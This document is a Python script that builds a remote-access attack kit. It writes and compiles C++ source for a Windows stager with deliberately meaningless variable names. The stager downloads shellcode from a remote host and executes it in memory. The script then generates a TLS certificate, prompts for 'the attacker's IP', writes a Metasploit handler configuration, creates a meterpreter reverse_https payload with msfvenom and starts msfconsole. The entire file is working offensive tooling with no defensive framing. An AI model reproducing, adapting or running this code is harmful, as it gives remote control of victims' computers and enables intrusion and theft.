import subprocess

cpp_template = '''\
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096

void a(char* b, char* c, char* d) {
    DWORD e = 0;
    BOOL f;
    size_t g = strlen(b) + 1;
    const size_t h = 100;
    size_t i = 0;
    wchar_t j[h];
    mbstowcs_s(&i, j, g, b, _TRUNCATE);
    WSADATA k;
    SOCKET l = INVALID_SOCKET;
    struct addrinfo* m = NULL, * n = NULL, o;
    char p[MAX_PATH] = "";
    lstrcatA(p, "GET /");
    lstrcatA(p, d);
    char q[DEFAULT_BUFLEN];
    memset(q, 0, DEFAULT_BUFLEN);
    int r;
    int s = DEFAULT_BUFLEN;
    i = WSAStartup(MAKEWORD(2, 2), &k);
    if (i != 0) {
        printf("WSAStartup failed with error: %d\\n", i);
        return;
    }
    ZeroMemory(&o, sizeof(o));
    o.ai_family = PF_INET;
    o.ai_socktype = SOCK_STREAM;
    o.ai_protocol = IPPROTO_TCP;
    i = getaddrinfo(b, c, &o, &m);
    if (i != 0) {
        printf("getaddrinfo failed with error: %d\\n", i);
        WSACleanup();
        return;
    }
    for (n = m; n != NULL; n = n->ai_next) {
        l = socket(n->ai_family, n->ai_socktype, n->ai_protocol);
        if (l == INVALID_SOCKET) {
            printf("socket failed with error: %ld\\n", WSAGetLastError());
            WSACleanup();
            return;
        }
        printf("[+] Connect to %s:%s", b, c);
        i = connect(l, n->ai_addr, (int)n->ai_addrlen);
        if (i == SOCKET_ERROR) {
            closesocket(l);
            l = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(m);
    if (l == INVALID_SOCKET) {
        printf("Unable to connect to server!\\n");
        WSACleanup();
        return;
    }
    i = send(l, p, (int)strlen(p), 0);
    if (i == SOCKET_ERROR) {
        printf("send failed with error: %d\\n", WSAGetLastError());
        closesocket(l);
        WSACleanup();
        return;
    }
    printf("\\n[+] Sent %ld Bytes\\n", i);
    i = shutdown(l, SD_SEND);
    if (i == SOCKET_ERROR) {
        printf("shutdown failed with error, Note: for the checksum: %d\\n", WSAGetLastError());
        closesocket(l);
        WSACleanup();
        return;
    }
    do {
        i = recv(l, (char*)q, s, 0);
        if (i > 0)
            printf("[+] Received %d Bytes\\n", i);
        else if (i == 0)
            printf("[+] Connection closed\\n");
        else
            printf("recv failed with error: %d\\n", WSAGetLastError());
        LPVOID t = VirtualAlloc(NULL, sizeof(q), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!t) {
            printf("Failed to Allocate memory (%u)\\n", GetLastError());
            return -1;
        }
        MoveMemory(t, q, sizeof(q));
        DWORD u;
        if (!VirtualProtect(t, sizeof(q), PAGE_EXECUTE_READ, &u)) {
            printf("Failed to change memory protection (%u)\\n", GetLastError());
            return -2;
        }
        HANDLE v = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)t, NULL, 0, NULL);
        if (!v) {
            printf("Failed to Create the thread (%u)\\n", GetLastError());
            return -3;
        }
        printf("\\n\\nalloc_mem : %p\\n", t);
        WaitForSingleObject(v, INFINITE);
        ((void(*)())t)();
        return 0;
    } while (i > 0);
    closesocket(l);
    WSACleanup();
}

int main(int argc, char** argv) {
    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n", argv[0]);
        return 1;
    }
    a(argv[1], argv[2], argv[3]);
    int x = 10;
    for (int i = 0; i < x; i++) {
        // Meaningless code snippet
    }
    return 0;
}
'''

# Save the C++ template to a file
with open('template.cpp', 'w') as file:
    file.write(cpp_template)

# Compile the C++ code using the specified command
compile_command = ['x86_64-w64-mingw32-g++', '--static', '-o', 'relay.exe', 'template.cpp', '-fpermissive', '-lws2_32']
try:
    subprocess.check_output(compile_command, stderr=subprocess.STDOUT)
    print("Compilation completed successfully.")
except subprocess.CalledProcessError as e:
    print("Compilation failed. Error message:")
    print(e.output.decode('utf-8'))


# Remove Process File
remove = "rm -r template.cpp"
subprocess.run(remove, shell=True, check=True)


# Generate OpenSSL certificate
openssl_cmd = 'openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 ' \
              '-subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" ' \
              '-keyout www.example.com.key ' \
              '-out www.example.com.crt && ' \
              'cat www.example.com.key www.example.com.crt > www.example.com.pem && ' \
              'rm -f www.example.com.key www.example.com.crt'

try:
    subprocess.run(openssl_cmd, shell=True, check=True)
    print("OpenSSL certificate generated.")
except subprocess.CalledProcessError as e:
    print(f"Error generating OpenSSL certificate: {e}")

# Prompt attacker for IP, port, and certificate file
attacker_ip = input("Enter the attacker's IP: ")
attacker_port = input("Enter the attacker's port: ")


# Create msfconfig.rc
msfconfig_content = f'''
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST {attacker_ip}
set LPORT {attacker_port}
set StagerVerifySSLCert true
set HandlerSSLCert www.example.com.pem
run
'''

msfconfig_filename = 'msfconfig.rc'
with open(msfconfig_filename, 'w') as file:
    file.write(msfconfig_content)

print("msfconfig.rc created.")

# Generate the beacon.bin payload using msfvenom
payload_file = 'beacon.bin'
payload_command = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={attacker_ip} LPORT={attacker_port} HandlerSSLCert=www.example.com.pem StagerVerifySSLCert=true -f raw -o {payload_file}"
subprocess.run(payload_command, shell=True)

# Execute msfconsole with the resource file
msfconsole_cmd = f'msfconsole -q -r {msfconfig_filename}'

try:
    subprocess.run(msfconsole_cmd, shell=True, check=True)
    print("msfconsole execution completed.")
except subprocess.CalledProcessError as e:
    print(f"Error executing msfconsole: {e}")
